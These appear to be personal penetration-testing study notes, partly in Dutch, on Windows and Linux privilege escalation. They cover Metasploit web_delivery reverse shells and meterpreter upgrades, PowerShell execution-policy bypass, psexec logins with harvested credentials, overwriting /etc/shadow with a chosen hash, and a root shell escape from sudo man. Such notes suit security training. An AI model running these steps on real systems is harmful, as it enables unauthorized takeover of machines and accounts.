
## Windows Privilege Escalation 


- PrivscCheck is a script that enumerate common Windows configuration issues that can be leveraged for local privilige escalation. It also gathers info that is usefull for exploitation or post exploitation: 
	- https://github.com/itm4n/PrivescCheck 

----

web_delivery module (`show info`)
- set target to powershell:` set target PSH\ (Binary`) 
- `set payload windows/shell/reverse_tcp `
- `set PSH-EncodedCommand false ` (we do not want it to encrypt with base 64)
- copy the powershell code provided 
  
- paste the code in the CMD session on victim system 
this will give you access to target system through command shell session. 
  
- migrate this session to meterpreter session: 
	- `search shell_to_meterpreter` module 
	- set lhost kali 
	- set lport (make sure its not the same as the existing shell session)
	- set session to shell session 
	- show advanced: 
		pwd

**powershell -ep bypass .\script.ps1** 
Hiermee wordt het uitvoeringsbeleid tijdelijk omzeild voor de huidige sessie, zodat het script kan worden uitgevoerd zonder problemen met de uitvoeringsbeleidsinstellingen.**


**Privilege escalation:** 
after migrating to a more stable process such as explorer you run getprivs to find out what the priviliges are (getprivs)

In meterpreter: 
- `cd C:\\ `
- go to the directory where the Privescheck powershell is stored and open a command shell: `shell` 
	- check github page on how to use the script 
- paste the command in the shell prompt 
- check summary results 


##### How to use the credentials found in Privescheck results?  

![[Pasted image 20230924152458.png]]
psexec authenticates on target system via SMB, we are not exploiting the system but only authenticating with legit credentials 

login on target system with psexec.py:
- `psexec.py Administrator@target_ip (`
- command shell session
	- `whoami` 
	- `net user `
	- `whoami /priv `

search in cmd: `dir /s *flag*` searches in current folder and sub folders.
cat in CMD is type 

Method 2 is with meterpreter session 
- search psexec 
- use`` exploit/windows/smb/psexec ``
- set lport that does not conflict with current sessions 
- set smb-password and smb-username with found credentials 

















## Linux Privilege escalation 

Linux priviliges: LinEnum 
Simple bash script that automates common Linux local enumeration check in addition identifying privilege escalation vulnerabilities. 
-> https://github.com/rebootuser/LinEnum 

---

##### Weak permissions 
CMD: 
	``whoami` 
	`cat /etc/passwd`
	`cat /etc/group `
	`groups student

find file that can be usefull in elevating privileges 
 
**`find / -not -type l -perm -o+w`**  

- . `find`: This is the command itself, used to search for files and directories.
- . `/`: This is the starting directory for the search. In this case, it's the root directory, so the command will search the entire file system.
- . `-not`: It means "not."
- . `-type l`: This part of the command specifies the type of file to search for. `-type l` looks for symbolic links (symlinks). Symlinks are files that point to another file or directory.
- . `-perm -o+w`: This part of the command specifies the permissions criteria. `-perm` is used to search for files based on their permissions, and `-o+w` looks for files that are writable by someone other than the owner.


/etc/shadow stores passwords and should only be viewed by the root user. 
cat out the content of the file 
we have access to the password files but we can only see the hashes. 
so this means that we have to replace the password with a hashed password (this way we can have access to the root user)

1. Confirm that you have access to the shadow file: `ls -al /etc/shadow `
   `cat /etc/shadow`
2. generate password you can replace: `openssl passwd -1 -salt abc youhavebeenhacked`
3. copy hashed password and replace in shadow file: `vim` `/etc/shadow `
   remove the * and paste the new password 
4. switch to the root account: `su` 
5. enter password of root user account with the value you set 


##### Sudo Privileges 

`cat /etc/passwd `
`sudo -l `(list of commands you can run as the user)

 
 /usr/bin/man can be exploited if misconfigured with sudo priviliges: 
 unprivileged can run this binary with sudo priviliges (root priviliges) without root password/  -- bypassing permissions & privileges
 
 man utility can allow users to spawn a bash session from within the utility, how: 

  try to run with sudo privliges:
  -  `sudo man ls `  (it should not ask for password)
  - we can spawn a bash session with: 
  `  !/bin/bash `
because we are running the man binary with pseudo priviliges, we are able to execute whatever, from the man binary. 




